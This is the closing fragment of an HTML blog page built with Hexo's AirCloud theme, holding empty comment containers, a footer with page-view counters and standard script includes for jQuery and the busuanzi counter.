</blockquote>

        
        <br />
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>

        <div id="lv-container">
        </div>

    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <span id="busuanzi_container_site_pv">
            <span id="busuanzi_value_site_pv"></span>PV
        </span>
        <span id="busuanzi_container_site_uv">
            <span id="busuanzi_value_site_uv"></span>UV
        </span>
        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "./public/search.xml"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="/js/index.js"></script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




</html>
